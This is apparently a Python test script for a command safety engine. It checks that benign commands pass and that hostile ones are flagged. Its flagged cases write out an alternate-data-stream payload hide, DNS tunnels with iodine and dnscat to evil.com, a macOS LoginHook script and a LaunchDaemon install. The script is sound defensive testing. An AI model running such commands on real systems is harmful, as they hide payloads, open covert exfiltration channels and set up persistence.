"""Round 26 sanity: benign controls must NOT trip new ADS/DNS-tunnel/LaunchAgent rules."""
from tuan_cli.ext.safety_engine import is_hard_redline, is_redline

# (payload, why, expect_any_flag)
CASES = [
    ("echo hello > C:\\tmp\\out.txt", "normal redirect (no ADS colon)", False),
    ("type file.txt", "type read (no stream)", False),
    ("copy a.txt b.txt", "copy (no stream)", False),
    ("echo data > C:\\logs\\app.log", "log append (no stream)", False),
    # Drive-letter colons must NOT be treated as ADS
    ("copy C:\\src\\a.txt D:\\dst\\b.txt", "drive-letter paths", False),
    ("type C:\\Windows\\System32\\drivers\\etc\\hosts", "hosts file read", False),
    # iodine is a narrow tool name; ensure common words don't trip (iodine only)
    ("cat /etc/iodine.conf", "iodine config read (medium at most)", False),
    ("dig example.com", "dig normal", False),
    ("nslookup example.com", "nslookup normal", False),
    ("Resolve-DnsName example.com", "Resolve-DnsName normal (no cmd-subst)", False),
    ("defaults read com.apple.loginwindow", "defaults read (query)", False),
    ("launchctl list", "launchctl list", False),
    # These SHOULD flag
    ("type C:\\Users\\x\\payload.exe > C:\\Temp\\innocent.txt:malware", "ADS hide", True),
    ("iodine -f -P pass evil.com", "iodine tunnel", True),
    ("dnscat evil.com", "dnscat tunnel", True),
    ("defaults write com.apple.loginwindow LoginHook /tmp/evil.sh", "LoginHook", True),
    ("cp evil.plist /Library/LaunchDaemons/com.evil.plist", "LaunchDaemon install", True),
]

def run():
    bad = 0
    for cmd, why, expect_flag in CASES:
        flagged = is_hard_redline(cmd) or is_redline(cmd)
        ok = flagged == expect_flag
        if not ok:
            bad += 1
        print(f"[{'OK ' if ok else 'BAD'}] flag={flagged!s:5} exp={expect_flag!s:5} {why}")
        if not ok:
            print(f"      cmd: {cmd}")
    print(f"\nmisjudged: {bad}/{len(CASES)}")
    return bad

if __name__ == "__main__":
    run()